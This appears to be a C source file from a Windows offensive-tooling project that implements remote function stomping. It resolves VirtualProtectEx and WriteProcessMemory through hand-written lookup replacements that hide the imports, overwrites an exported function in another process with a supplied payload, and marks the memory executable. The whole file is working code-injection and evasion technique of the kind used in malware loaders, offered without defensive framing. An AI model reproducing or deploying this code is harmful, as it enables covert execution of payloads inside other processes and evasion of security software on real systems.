#include "common.h"


PVOID StompRemoteFunction(IN HANDLE hProcess, IN LPCWSTR sStompModule, IN LPCSTR sStompFunction, IN PVOID pPayload, IN SIZE_T sPayloadSize)
{
	// API calls
	f_VirtualProtectEx rVirtualProtectEx = GetProcAddressReplacement(GetModuleHandleReplacement(L"kernel32.dll"), "VirtualProtectEx");
	f_WriteProcessMemory rWriteProcessMemory = GetProcAddressReplacement(GetModuleHandleReplacement(L"kernel32.dll"), "WriteProcessMemory");

	// Get a handle on victim function [DONT USE SOMETHING THAT IS ACTUALLY CALLED!!]
	PVOID pAddress = GetProcAddressReplacement(GetModuleHandleReplacement(sStompModule), sStompFunction);

	// Overwrite process function
	DWORD dwOld = NULL;
	SIZE_T sNumBytes = NULL;
	rVirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_READWRITE, &dwOld);
	rWriteProcessMemory(hProcess, pAddress, pPayload, sPayloadSize, &sNumBytes);
	rVirtualProtectEx(hProcess, pAddress, sPayloadSize, PAGE_EXECUTE_READ, &dwOld);

	return pAddress;
}